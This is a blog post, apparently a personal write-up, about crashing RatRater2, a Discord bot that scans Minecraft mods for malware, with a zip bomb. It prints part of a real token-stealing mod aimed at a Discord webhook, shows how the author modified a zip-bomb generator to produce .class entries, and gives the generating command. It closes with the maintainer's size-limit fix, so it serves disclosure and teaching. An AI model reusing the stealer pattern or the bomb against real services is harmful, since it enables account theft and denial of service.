@@ -1,0 +1,300 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+        <meta content="text/html; charset=UTF-8" http-equiv="content-type"/>
+        <meta content="width=device-width, initial-scale=1" name="viewport"/>
+
+        
+        
+        
+
+        
+
+        
+        
+        
+
+        
+        
+        
+
+        
+        
+        
+
+        <title>Crashing malware detection with zip bombs</title>
+        
+        <meta name="title" content="Crashing malware detection with zip bombs">
+        
+        <meta name="description" content="Some random ramblings">
+        <meta name="generator" content="Zola v0.16.1">
+
+        <meta property="og:type" content="website">
+        <meta property="og:url" content="https://Dev380.github.io/blog/crashing-ratrater/">
+        <meta property="og:site_name" content="Hello there 👋">
+        <meta property="og:title" content="Crashing malware detection with zip bombs">
+        <meta property="og:description" content="Some random ramblings">
+        <meta property="og:image" content="https:&#x2F;&#x2F;Dev380.github.io&#x2F;images&#x2F;Dev380.png">
+
+        
+        
+        <meta property="twitter:card" content="summary_large_image">
+        <meta property="twitter:url" content="https://Dev380.github.io/blog/crashing-ratrater/">
+        <meta property="twitter:title" content="Crashing malware detection with zip bombs">
+        <meta property="twitter:description" content="Some random ramblings">
+        <meta property="twitter:image" content="https:&#x2F;&#x2F;Dev380.github.io&#x2F;images&#x2F;Dev380.png">
+        
+        
+        <link rel="canonical" href="https://Dev380.github.io/blog/crashing-ratrater/">
+        <link rel="shortcut icon" type="image/x-icon" href="https://Dev380.github.io/images/Dev380.png">
+        <script type="application/ld+json">
+            {
+                "description":"Some random ramblings",
+                "url":"https://Dev380.github.io/blog/crashing-ratrater/",
+                "@type":"WebSite",
+                "headline":"Crashing malware detection with zip bombs",
+                "name":"Crashing malware detection with zip bombs",
+                
+                "@context":"https://schema.org"
+            }
+        </script>
+        
+        
+        
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="https://Dev380.github.io/atom.xml">
+        
+        
+        
+<link rel="preload" href="https://Dev380.github.io/style.css" as="style" crossorigin>
+ <link rel="preload" href="/fonts/iosevka-regular.woff2" as="font" type="font/woff2" crossorigin>
+ <link rel="stylesheet" href="https://Dev380.github.io/style.css"/>
+
+    </head>
+    <body theme="auto">
+        <div class="w">
+            <header>
+                
+                
+<p><a href="..">..</a>/crashing-ratrater</p>
+<p class="post-meta"><time datetime="2023-06-29">2023-06-29</time></p>
+<h1>Crashing malware detection with zip bombs</h1>
+
+            </header>
+            <main class="page-content" aria-label="Content">
+                
+
+
+
+<p><hr data-content="prologue" \>
+A remote access trojan (RAT) is a form of malware that is designed to give secret  (trojan) and full backdoor access to the victim's computer (remote access). Like many terms, Minecraft players like to apply them to the game with more-or-less accurate in-game definitions (do T flip flops and item entaglement ring a bell?).</p>
+<p>Minecraft RATs fall on the less accurate side - most &quot;remote access trojans&quot; in Minecraft simply steal your game token, a 24 hour, unrevocable (thanks, Mojang) session identifier used for connecting to the game, with the principle motivation being stealing valuable items from Hypixel skyblock. As far as I can tell, the only real reason Minecraft players call it a RAT is how fun it is to say the word. For example, a real example of a (not very good) RAT is:</p>
+<pre data-lang="java" style="background-color:#fdf6e3;color:#657b83;" class="language-java "><code class="language-java" data-lang="java"><span>@</span><span style="color:#268bd2;">Mod</span><span>(</span><span style="color:#268bd2;">modid </span><span>= </span><span style="color:#859900;">JSONrareException</span><span>.</span><span style="color:#cb4b16;">MODID</span><span>, </span><span style="color:#268bd2;">version </span><span>= </span><span style="color:#859900;">JSONrareException</span><span>.</span><span style="color:#cb4b16;">VERSION</span><span>)
+</span><span style="color:#586e75;">public </span><span style="color:#268bd2;">class </span><span style="color:#b58900;">JSONrareException </span><span>{
+</span><span>    </span><span style="color:#586e75;">private static </span><span style="color:#859900;">String </span><span>blank = </span><span style="color:#839496;">&quot;&quot;</span><span>;
+</span><span>    </span><span style="color:#586e75;">static </span><span style="color:#859900;">Minecraft </span><span>mc = </span><span style="color:#859900;">Minecraft</span><span>.</span><span style="color:#b58900;">getMinecraft</span><span>();
+</span><span>    </span><span style="color:#586e75;">public static </span><span style="color:#859900;">String </span><span>name = mc.</span><span style="color:#b58900;">getSession</span><span>().</span><span style="color:#b58900;">getProfile</span><span>().</span><span style="color:#b58900;">getName</span><span>();
+</span><span>    </span><span style="color:#586e75;">public static </span><span style="color:#859900;">String </span><span>uuid = mc.</span><span style="color:#b58900;">getSession</span><span>().</span><span style="color:#b58900;">getProfile</span><span>().</span><span style="color:#b58900;">getId</span><span>().</span><span style="color:#b58900;">toString</span><span>();
+</span><span>    </span><span style="color:#586e75;">public static </span><span style="color:#859900;">String </span><span>token = mc.</span><span style="color:#b58900;">getSession</span><span>().</span><span style="color:#b58900;">getToken</span><span>();
+</span><span>    </span><span style="color:#586e75;">public static </span><span style="color:#859900;">String </span><span>nameonpc = </span><span style="color:#859900;">System</span><span>.</span><span style="color:#b58900;">getProperty</span><span>(</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">user.name</span><span style="color:#839496;">&quot;</span><span>);
+</span><span>    </span><span style="color:#586e75;">public static </span><span style="color:#859900;">String </span><span>dataGrabbings = </span><span style="color:#839496;">&quot;&quot;</span><span>;
+</span><span>    </span><span style="color:#586e75;">private static </span><span style="color:#859900;">File </span><span>appData = </span><span style="color:#859900;">new File</span><span>(</span><span style="color:#859900;">System</span><span>.</span><span style="color:#b58900;">getenv</span><span>(</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">APPDATA</span><span style="color:#839496;">&quot;</span><span>));
+</span><span>    </span><span style="color:#586e75;">private static </span><span style="color:#859900;">File </span><span>localAppData = </span><span style="color:#859900;">new File</span><span>(</span><span style="color:#859900;">System</span><span>.</span><span style="color:#b58900;">getenv</span><span>(</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">LOCALAPPDATA</span><span style="color:#839496;">&quot;</span><span>));
+</span><span>
+</span><span>    </span><span style="color:#586e75;">public static </span><span style="color:#859900;">String </span><span>webthingy = </span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">https://discord.com/api/web</span><span style="color:#839496;">&quot;</span><span>+blank+</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">hooks/</span><span style="color:#839496;">&quot;</span><span>+</span><span style="color:#839496;">&quot;&quot;</span><span>;
+</span><span>    </span><span style="color:#586e75;">public static </span><span style="color:#859900;">String </span><span>screenshotspamhook = </span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">https://discord.com/api/web</span><span style="color:#839496;">&quot;</span><span>+blank+</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">hooks/</span><span style="color:#839496;">&quot;</span><span>+</span><span style="color:#839496;">&quot;&quot;</span><span>;
+</span><span>    </span><span style="color:#93a1a1;">// ...
+</span></code></pre>
+<p>This particular malware sample attempts to grab the session token (and other data) and send it through a discord webhook (most rat authors use an intermediary C&amp;C server to prevent fake data from being sent). It comes in the form of a <a href="https://docs.minecraftforge.net/en/latest/gettingstarted/">Forge</a> mod, disguised by the distributor as a mod that will help you get rich in the game Hypixel skyblock. Of course, the opposite happens, with the &quot;ratter&quot; (as they are colloquially called) stealing all of your in-game wealth.</p>
+<p>Many ratters today have moved on to phishing with oauth links (session IDs for Minecraft generated through Microsoft oauth last for 14 days, even if the oauth is revoked! Thanks, Microsoft), or sending password reset links as a &quot;discord verification measure&quot; (known as &quot;botphishing&quot;). However, there still exists a need to detect jar mod-based rats, partly because virustotal can't detect them, <a href="https://www.virustotal.com/gui/file-analysis/ZmZkY2I0ZTZlOTM2ZDc5NDYxYjEyYzYxN2Y3ZGFhNzg6MTY4ODA2NzY3Ng==">even without obfuscation</a>.</p>
+<p><hr data-content="ratrater" \>
+Enter RatRater2: an amazing tool developed by <a href="https://github.com/KTibow">Ktibow</a> used to detect malware disguised as forge mods. Using combinations of rule-based detection, heuristical analysis and decision trees, it is the premier tool used for preliminary analysis, or for less tech-savvy players who want to make sure their mods are safe. Recently, Ktibow has created a <a href="https://github.com/KTibow/RatRater2Back/tree/main/discord-bot">discord application</a> to make scanning mods even more convenient.</p>
+<p><hr data-content="uh oh" \>
+However, there is a major flaw with the bot. Hint: read this part of the JAR file format <a href="https://docs.oracle.com/javase/7/docs/technotes/guides/jar/jar.html#Intro">specification</a>:</p>
+<blockquote>
+<p>JAR file is a file format based on the popular ZIP file format and is used for aggregating many files into one. A  JAR file is essentially a zip file that contains an optional META-INF directory. A JAR file can be created by the command-line jar tool, or by using the  java.util.jar API in the Java platform. There is no restriction on the name of a JAR file, it can be any legal file name on a particular platform.</p>
+</blockquote>
+<p>Do you see the problem? Maybe the title gave it away. With the original browser-based RatRater2, all the analysis happens locally; there is no opportunity for a DoS attack with a fully client-sided application. Unfortunately, necessarily, a discord bot must do all its processing on the server (in RatRater2's case, with serverless functions). This opens up RatRater2 to a simple attack: simply upload a zip bomb, and the bot should go offline until the worker restarts? </p>
+<p><hr data-content="a shallow dive into zip bombs" \>
+A zip file is simply a container format (similar to .tar without the .gz), but is capable of being extended to compress the files in its container, usually with the DEFLATE algorithm. The zip file must necessarily be smaller than the total decompressed output, allowing for a simple attack: fill a terabyte of data with the same byte, and compress it with a zip tool. The resulting archive should be around 1 GB in size, due to DEFLATE's maximium compression ratio being 1024. Surely decompressing a terabyte of data will crash any free-tier serverless hosting. Alas, I am not sure that discord will be too happy with someone spamming 1 GB file uploads to their server. We need a better solution.</p>
+<p>An ingenious solution was presented by David Fifield, taking advantage of the fact that zip is, at its core, a file archiving format meant to pack multiple files into one. An analogy of the zip format (at least the parts that matter to us) is a contiguous collection of &quot;fat pointers&quot; and &quot;data payloads&quot;, storing total file length and compressed file data respectively.</p>
+<p>Here is an example of this simplified analogy:</p>
+<pre style="background-color:#fdf6e3;color:#657b83;"><code><span>| length: 1 | data byte | length: 5 | data byte | data byte | data byte | data byte | data byte | length: 1 | data byte |
+</span></code></pre>
+<p>Fifield's brilliant idea is to do something akin to a &quot;buffer overread&quot; - what if we simply increased the range of the length in each &quot;file pointer&quot;?</p>
+<pre style="background-color:#fdf6e3;color:#657b83;"><code><span>| length: 8 | length: 7 | length: 6 | length: 5 | length: 4 | length: 3 | data byte | data byte | data byte |
+</span></code></pre>
+<p>Of course, if you look closely at the ZIP spec, the above is invalid: file entries (a more accurate name for the &quot;pointers&quot; in the analogy) are not valid data. However, Fifield adds a small bit of data in front of each file entry to make it work in practice. How much data is generated with this method? In the above example, the answer is <code>3 + 4 + 5 + 6 + 7 + 8</code>, or:</p>
+<pre style="background-color:#fdf6e3;color:#657b83;"><code><span>(6/2) * (2 * 3 + (6 - 1)) // formula for arithmetic series&#39;
+</span><span>33
+</span></code></pre>
+<p>If we define <code>k</code> to be the amount of data bytes at the end (Fifield calls this a &quot;kernel&quot;) and defining <code>x</code> to be the amount of files, we get the general form:</p>
+<pre style="background-color:#fdf6e3;color:#657b83;"><code><span>(x/2) * (x + 2k -1)
+</span><span>(1/2) * (x^2 + (2k - 1)x)
+</span></code></pre>
+<p>Notice that the space used by the zip bomb increases quadratically by the amount of files in the zip bomb (if I were to do one more abuse of nation, I might call this <code>O(n^2)</code>). Compared to the space used by a regular zip file, (which always decompresses to 1024 times the compressed size at maximum, which I might call <code>O(n)</code>), this method creates extremely large files, transcending DEFLATE's compression limit of 1024 by a lot. In fact, a 42 kilobyte file (an homage to <a href="https://www.unforgettable.dk/">42.zip</a>) decompresses to &quot;just&quot; 5 gigabytes, but a 10 megabyte file decompresses to <a href="https://www.bamsoftware.com/hacks/zipbomb/">over 200 TB</a>!</p>
+<p><hr data-content="exploitation(?!)" \>
+Of course, this is obviously powerful enough to target RatRater2's cloud infrastructure, if the attack works correctly.</p>
+<p>Ktibow claimed that this would not work, when discussing this idea with him. He believes the function isolation means that I would just kill the runner for the worker processing my command specifically. I am unfamiliar with serverless discord bots, so his theory seemed logical. Nevertheless, I decided to test it for myself with an <a href="https://www.bamsoftware.com/hacks/zipbomb/">off-the-shelf zipbomb</a>, renamed to <code>skyutils.jar</code> to pass the file format requirements of RatRater2. And it seemed like Ktibow was right, RatRater2 analyzes the file perfectly fine!</p>
+<p><img src="/images/unsuccessful_zipbomb.png" alt="Unsuccessful zipbomb attempt" /></p>
+<p>After pondering for a while though, it doesn't seem like Ktibow's explanation is fully correct - if the zip bomb is truly contained to my specific command invocation, that should mean the command should fail, but every other command will be processed correctly. I'm forced to look through the code 😔</p>
+<p>From <a href="https://github.com/KTibow/RatRater2Back/blob/2e8142922f03e5d871350118fa99717d716806b7/discord-bot/src/scan.ts">2e81429</a>:</p>
+<pre data-lang="typescript" style="background-color:#fdf6e3;color:#657b83;" class="language-typescript "><code class="language-typescript" data-lang="typescript"><span style="color:#268bd2;">const tasks </span><span>= </span><span style="color:#268bd2;">files
+</span><span>    .</span><span style="color:#b58900;">filter</span><span>((</span><span style="color:#268bd2;">path</span><span>) </span><span style="color:#268bd2;">=&gt; path</span><span>.</span><span style="color:#b58900;">endsWith</span><span>(</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">.class</span><span style="color:#839496;">&quot;</span><span>))
+</span><span>    .</span><span style="color:#b58900;">map</span><span>(</span><span style="color:#586e75;">async </span><span>(</span><span style="color:#268bd2;">f</span><span>) </span><span style="color:#268bd2;">=&gt; </span><span>{
+</span><span>        </span><span style="color:#268bd2;">const contents </span><span>= </span><span style="color:#859900;">await </span><span style="color:#268bd2;">zip</span><span>.</span><span style="color:#268bd2;">files[f]</span><span>.</span><span style="color:#b58900;">async</span><span>(</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">string</span><span style="color:#839496;">&quot;</span><span>);
+</span><span>        </span><span style="color:#b58900;">scan</span><span>(</span><span style="color:#268bd2;">f</span><span>, </span><span style="color:#268bd2;">contents</span><span>, </span><span style="color:#268bd2;">state</span><span>);
+</span><span>    });
+</span></code></pre>
+<p>RatRater2 uses a library called <a href="https://stuk.github.io/jszip/">jszip</a> to decompress zip files. Originally, I thought that this library would decompress all the files when <code>loadAsync</code> is called on the jar. However, most zip utilities, including this one, simply collect all the &quot;file pointers&quot; in the zip format without decompressing them. Thus, none of the data was actually decompressed until <code>.async(&quot;string&quot;)</code> was called in the above code snippet, which actually decompresses the files. From the code, it is clear that RatRater2 only decompresses files for analysis if they end in <code>.class</code> (the extension for compiled java bytecode files). Obviously, Fifield's original zip bombs do not use this file extension for the file name, to save space (in fact, the calculations for total decompressed size earlier assumed that file entry size is negligible). </p>
+<p><hr data-content="actually touching code" \>
+Fortunately, Fifield uploaded his zipbomb code (hilariously, as a <a href="https://www.bamsoftware.com/hacks/zipbomb/zipbomb-20210121.zip">zip file</a>). The important file here is <code>zipbomb</code>, a python script that actually generates the zip bombs. We just need to change every file name to end in <code>.class</code> for RatRater2 to unzip them all, so:</p>
+<pre data-lang="python" style="background-color:#fdf6e3;color:#657b83;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#268bd2;">FILENAME_ALPHABET </span><span>= </span><span style="color:#268bd2;">b</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><span style="color:#839496;">&quot;
+</span><span style="color:#859900;">def </span><span style="color:#b58900;">filename_for_index</span><span>(</span><span style="color:#268bd2;">i</span><span>):
+</span><span>    letters = []
+</span><span>    </span><span style="color:#859900;">while </span><span style="color:#b58900;">True</span><span>:
+</span><span>        letters.</span><span style="color:#b58900;">insert</span><span>(</span><span style="color:#6c71c4;">0</span><span>, </span><span style="color:#268bd2;">FILENAME_ALPHABET[</span><span>i % </span><span style="color:#859900;">len</span><span>(</span><span style="color:#268bd2;">FILENAME_ALPHABET</span><span>)</span><span style="color:#268bd2;">]</span><span>)
+</span><span>        i = i // </span><span style="color:#859900;">len</span><span>(</span><span style="color:#268bd2;">FILENAME_ALPHABET</span><span>) - </span><span style="color:#6c71c4;">1
+</span><span>        </span><span style="color:#859900;">if </span><span>i &lt; </span><span style="color:#6c71c4;">0</span><span>:
+</span><span>            </span><span style="color:#859900;">break
+</span><span>    </span><span style="color:#859900;">return bytes</span><span>(letters)
+</span></code></pre>
+<p>Will turn into this:</p>
+<pre data-lang="python" style="background-color:#fdf6e3;color:#657b83;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#268bd2;">FILENAME_ALPHABET </span><span>= </span><span style="color:#268bd2;">b</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmopqrstuvwxyz:_-?#*()|&#39;</span><span style="color:#dc322f;">\&quot;</span><span style="color:#cb4b16;">{}</span><span style="color:#2aa198;">[]+=</span><span style="color:#839496;">&quot;
+</span><span style="color:#859900;">def </span><span style="color:#b58900;">filename_for_index</span><span>(</span><span style="color:#268bd2;">i</span><span>):
+</span><span>    letters = []
+</span><span>    </span><span style="color:#859900;">while </span><span style="color:#b58900;">True</span><span>:
+</span><span>        letters.</span><span style="color:#b58900;">insert</span><span>(</span><span style="color:#6c71c4;">0</span><span>, </span><span style="color:#268bd2;">FILENAME_ALPHABET[</span><span>i % </span><span style="color:#859900;">len</span><span>(</span><span style="color:#268bd2;">FILENAME_ALPHABET</span><span>)</span><span style="color:#268bd2;">]</span><span>)
+</span><span>        i = i // </span><span style="color:#859900;">len</span><span>(</span><span style="color:#268bd2;">FILENAME_ALPHABET</span><span>) - </span><span style="color:#6c71c4;">1
+</span><span>        </span><span style="color:#859900;">if </span><span>i &lt; </span><span style="color:#6c71c4;">0</span><span>:
+</span><span>            </span><span style="color:#859900;">break
+</span><span>    </span><span style="color:#859900;">return bytes</span><span>(letters + </span><span style="color:#859900;">list</span><span>(</span><span style="color:#268bd2;">b</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">.class</span><span style="color:#839496;">&quot;</span><span>))
+</span></code></pre>
+<p>Notice that <code>.class</code> is added to the end of every filename, and I added a bunch of file-safe characters (on GNU/Linux at least) to the alphabet (as Fifield wanted to make sure the zipbombs were compatible with Windows and Mac too). The <code>Makefile</code> says this is the command to use to make the 10 MB -&gt; 200 TB zipbomb:</p>
+<pre data-lang="make" style="background-color:#fdf6e3;color:#657b83;" class="language-make "><code class="language-make" data-lang="make"><span style="color:#b58900;">zblg.zip</span><span>:
+</span><span>    </span><span style="color:#859900;">$(</span><span style="color:#268bd2;">ZIPBOMB</span><span style="color:#859900;">) </span><span style="color:#268bd2;">--mode</span><span>=</span><span style="color:#2aa198;">quoted_overlap </span><span style="color:#268bd2;">--num-files</span><span>=</span><span style="color:#2aa198;">65534 </span><span style="color:#268bd2;">--max-uncompressed-size</span><span>=</span><span style="color:#2aa198;">4292788525 </span><span>&gt; </span><span style="color:#839496;">&quot;</span><span style="color:#d33682;">$@</span><span style="color:#839496;">&quot;
+</span></code></pre>
+<p>So, let's give it a run!</p>
+<pre style="background-color:#fdf6e3;color:#657b83;"><code><span>❯ python3 zipbomb --mode=quoted_overlap --num-files=65534 --max-uncompressed-size=4292788525
+</span><span>Traceback (most recent call last):
+</span><span>  File &quot;/home/Dev380/zipbomb/zipbomb&quot;, line 813, in &lt;module&gt;
+</span><span>    main()
+</span><span>  File &quot;/home/Dev380/zipbomb/zipbomb&quot;, line 810, in main
+</span><span>    mode(sys.stdout.buffer, num_files, compressed_size=compressed_size, max_uncompressed_size=max_uncompressed_size, compression_method=compression_method, zip64=zip64, template=template, extra_tag=extra_tag, max_quoted=max_quoted)
+</span><span>  File &quot;/home/Dev380/zipbomb/zipbomb&quot;, line 636, in write_zip_quoted_overlap
+</span><span>    header_bytes = files[0].header.serialize(zip64=zip64)
+</span><span>                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+</span><span>  File &quot;/home/Dev380/zipbomb/zipbomb&quot;, line 396, in serialize
+</span><span>    return struct.pack(&quot;&lt;LHHHHHLLLHH&quot;,
+</span><span>           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+</span><span>struct.error: &#39;L&#39; format requires 0 &lt;= number &lt;= 4294967295
+</span></code></pre>
+<p>I still haven't figured out what this error means, but it's fine - I can just cut the <code>--max-uncompressed-size</code> in half (100 TB ought to be enough, right?)</p>
+<p>And... the command works! Let's see the output of the command with <code>unzip</code> (remember, most zip utilities don't crash from zip bombs when they just open zip files and not decompress them)</p>
+<pre style="background-color:#fdf6e3;color:#657b83;"><code><span>❯ unzip -l skyutils.jar
+</span><span>...
+</span><span>2292789091  1982-10-08 13:37   9x].class
+</span><span>2292789052  1982-10-08 13:37   9x+.class
+</span><span>2292789013  1982-10-08 13:37   9x=.class
+</span><span>2292788974  1982-10-08 13:37   9y0.class
+</span><span>2292788935  1982-10-08 13:37   9y1.class
+</span><span>2292788896  1982-10-08 13:37   9y2.class
+</span><span>2292788857  1982-10-08 13:37   9y3.class
+</span><span>2292788818  1982-10-08 13:37   9y4.class
+</span><span>2292788779  1982-10-08 13:37   9y5.class
+</span><span>2292788740  1982-10-08 13:37   9y6.class
+</span><span>2292788701  1982-10-08 13:37   9y7.class
+</span><span>2292788662  1982-10-08 13:37   9y8.class
+</span><span>2292788623  1982-10-08 13:37   9y9.class
+</span><span>2292788584  1982-10-08 13:37   9yA.class
+</span><span>2292788545  1982-10-08 13:37   9yB.class
+</span><span>2292788506  1982-10-08 13:37   9yC.class
+</span><span>2292788467  1982-10-08 13:37   9yD.class
+</span><span>---------                     -------
+</span><span>150339325883963                     65534 files
+</span></code></pre>
+<p>That's 136 TB! Sure enough, RatRater2's CPU usage skyrockets and crashes from attempting to unzip all that.</p>
+<p><img src="/images/ratrater2_cpu.png" alt="CPU usage high! Credit: Ktibow" /></p>
+<p>After reporting this to Ktibow, he decided to fix it by adding a file limit to the uplaoded jar archives:</p>
+<pre data-lang="typescript" style="background-color:#fdf6e3;color:#657b83;" class="language-typescript "><code class="language-typescript" data-lang="typescript"><span style="color:#859900;">if </span><span>(</span><span style="color:#268bd2;">files</span><span>.</span><span style="color:#859900;">length &gt; </span><span style="color:#6c71c4;">10000</span><span>) {
+</span><span>    </span><span style="color:#268bd2;">const officialEmbed </span><span>= </span><span style="color:#b58900;">genOfficialEmbed</span><span>();
+</span><span>    </span><span style="color:#859900;">await </span><span style="color:#b58900;">updateMessage</span><span>({
+</span><span>        content:
+</span><span>          </span><span style="color:#839496;">`</span><span style="color:#2aa198;">🚫 ${</span><span style="color:#268bd2;">files</span><span style="color:#2aa198;">.</span><span style="color:#859900;">length</span><span style="color:#2aa198;">} classes is too many. </span><span style="color:#839496;">` </span><span>+
+</span><span>          </span><span style="color:#839496;">`</span><span style="color:#2aa198;">RR2 (the bot) would crash if it tried to scan this.</span><span style="color:#839496;">`</span><span>,
+</span><span>        embeds: </span><span style="color:#268bd2;">officialEmbed </span><span style="color:#859900;">? </span><span style="color:#268bd2;">[officialEmbed] </span><span style="color:#859900;">: </span><span style="color:#268bd2;">[]</span><span>,
+</span><span>    });
+</span><span>    </span><span style="color:#859900;">return</span><span>;
+</span><span>}
+</span></code></pre>
+<p>Unfortunately, this doesn't work. See the difference between RatRater2's code and Apache's:</p>
+<pre data-lang="java" style="background-color:#fdf6e3;color:#657b83;" class="language-java "><code class="language-java" data-lang="java"><span style="color:#93a1a1;">/**
+</span><span style="color:#93a1a1;">* This class wraps a </span><span>{</span><span style="color:#859900;">@link </span><span style="color:#93a1a1;">ZipFile</span><span>}</span><span style="color:#93a1a1;"> in order to check the
+</span><span style="color:#93a1a1;">* entries for &lt;</span><span style="color:#268bd2;">a </span><span style="color:#b58900;">href</span><span>=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">https://en.wikipedia.org/wiki/Zip_bomb</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;zip bombs&lt;/</span><span style="color:#268bd2;">a</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#93a1a1;">* while reading the archive.
+</span><span style="color:#93a1a1;">* If a </span><span>{</span><span style="color:#859900;">@link </span><span style="color:#93a1a1;">ZipInputStream</span><span>}</span><span style="color:#93a1a1;"> is directly used, the wrapper
+</span><span style="color:#93a1a1;">* can be applied via </span><span>{</span><span style="color:#859900;">@link </span><span style="color:#93a1a1;">#addThreshold(InputStream)</span><span>}</span><span style="color:#93a1a1;">.
+</span><span style="color:#93a1a1;">* The alert limits can be globally defined via </span><span>{</span><span style="color:#859900;">@link </span><span style="color:#93a1a1;">#setMaxEntrySize(long)</span><span>}
+</span><span style="color:#93a1a1;">* and </span><span>{</span><span style="color:#859900;">@link </span><span style="color:#93a1a1;">#setMinInflateRatio(double)</span><span>}</span><span style="color:#93a1a1;">.
+</span><span style="color:#93a1a1;">*/
+</span><span style="color:#586e75;">public </span><span style="color:#268bd2;">class </span><span style="color:#b58900;">ZipSecureFile </span><span style="color:#859900;">extends </span><span style="color:#268bd2;">ZipFile </span><span>{
+</span><span>   </span><span style="color:#586e75;">private static </span><span style="color:#859900;">POILogger </span><span>logger = </span><span style="color:#859900;">POILogFactory</span><span>.</span><span style="color:#b58900;">getLogger</span><span>(</span><span style="color:#859900;">ZipSecureFile</span><span>.</span><span style="color:#d33682;">class</span><span>);
+</span><span>   
+</span><span>   </span><span style="color:#586e75;">private static </span><span style="color:#268bd2;">double </span><span style="color:#b58900;">MIN_INFLATE_RATIO </span><span>= </span><span style="color:#6c71c4;">0.01</span><span style="color:#268bd2;">d</span><span>;
+</span><span>   </span><span style="color:#586e75;">private static </span><span style="color:#268bd2;">long </span><span style="color:#b58900;">MAX_ENTRY_SIZE </span><span>= </span><span style="color:#6c71c4;">0xFFFFFFFF</span><span style="color:#268bd2;">l</span><span>;
+</span></code></pre>
+<p>We need to define a maximum <em>decompressed size</em>, not a file limit, to be fully safe. The decompresed size can be calculated from the metadata included in each file entry, without decompressing. In fact, by setting the max file limit in the <code>zipbomb</code> program to 10000 (exactly RatRater2's limit), we produce a zip bomb with 39 TB of data.</p>
+<p><hr data-content="the end?" \>
+Ktibow fixed it in the end:</p>
+<pre data-lang="typescript" style="background-color:#fdf6e3;color:#657b83;" class="language-typescript "><code class="language-typescript" data-lang="typescript"><span style="color:#268bd2;">let totalSize </span><span>= </span><span style="color:#6c71c4;">0</span><span>;
+</span><span style="color:#859900;">for </span><span>(</span><span style="color:#268bd2;">const file </span><span style="color:#859900;">of </span><span style="color:#268bd2;">files</span><span>) {
+</span><span>    </span><span style="color:#93a1a1;">// @ts-ignore
+</span><span>    </span><span style="color:#268bd2;">const size </span><span>= </span><span style="color:#268bd2;">zip</span><span>.</span><span style="color:#268bd2;">files[file]</span><span>.</span><span style="color:#268bd2;">_data</span><span>.</span><span style="color:#268bd2;">uncompressedSize</span><span>;
+</span><span>    </span><span style="color:#268bd2;">totalSize </span><span>+= </span><span style="color:#268bd2;">size </span><span style="color:#859900;">&lt; </span><span style="color:#6c71c4;">0 </span><span style="color:#859900;">? </span><span style="color:#268bd2;">size </span><span>+ </span><span style="color:#6c71c4;">2 </span><span>** </span><span style="color:#6c71c4;">32 </span><span style="color:#859900;">: </span><span style="color:#268bd2;">size</span><span>;
+</span><span>}
+</span><span style="color:#268bd2;">const gb </span><span>= </span><span style="color:#268bd2;">totalSize </span><span>/ </span><span style="color:#6c71c4;">1024 </span><span>/ </span><span style="color:#6c71c4;">1024 </span><span>/ </span><span style="color:#6c71c4;">1024</span><span>;
+</span><span style="color:#859900;">if </span><span>(</span><span style="color:#268bd2;">gb </span><span style="color:#859900;">&gt; </span><span style="color:#6c71c4;">0.5</span><span>) {
+</span><span>    </span><span style="color:#268bd2;">const officialEmbed </span><span>= </span><span style="color:#b58900;">genOfficialEmbed</span><span>();
+</span><span>    </span><span style="color:#859900;">await </span><span style="color:#b58900;">updateMessage</span><span>({
+</span><span>        content:
+</span><span>            </span><span style="color:#839496;">`</span><span style="color:#2aa198;">🚫 ${</span><span style="color:#268bd2;">gb</span><span style="color:#2aa198;">.</span><span style="color:#b58900;">toFixed</span><span>(</span><span style="color:#6c71c4;">2</span><span>)</span><span style="color:#2aa198;">} GB of classes is too big. </span><span style="color:#839496;">` </span><span>+
+</span><span>            </span><span style="color:#839496;">`</span><span style="color:#2aa198;">RR2 (the bot) would crash if it tried to scan this.</span><span style="color:#839496;">`</span><span>,
+</span><span>        embeds: </span><span style="color:#268bd2;">officialEmbed </span><span style="color:#859900;">? </span><span style="color:#268bd2;">[officialEmbed] </span><span style="color:#859900;">: </span><span style="color:#268bd2;">[]</span><span>,
+</span><span>    });
+</span><span>    </span><span style="color:#859900;">return</span><span>;
+</span><span>}
+</span></code></pre>
+<p>That's the proper solution! No more DoSing by malicious actors/curious teens :D</p>
+<p>If you haven't already, check out <a href="https://ktibow.github.io/RatRater2/">RatRater2</a> and its <a href="https://discord.com/api/oauth2/authorize?client_id=1121073730991439948&amp;permissions=0&amp;scope=applications.commands">discord bot</a> if you or your friends play Hypixel skyblock, it's really useful for quick checks if you don't feel like decompiling a mod (although the web version has a built-in decompiler!).</p>
+
+
+            </main>
+            <footer>
+                
+<script src="https://giscus.app/client.js"
+        data-repo="Dev380/Dev380.github.io"
+        data-repo-id="R_kgDOJ11zZw"
+        data-category="Comments"
+        data-category-id="DIC_kwDOJ11zZ84CXkg-"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="light"
+        data-lang="en"
+        data-loading="lazy"
+        crossorigin="anonymous"
+        async>
+</script>
+<p class="taxonomies">
+
+</p>
+
+                
+            </footer>
+        </div>
+    </body>
+</html>
+        
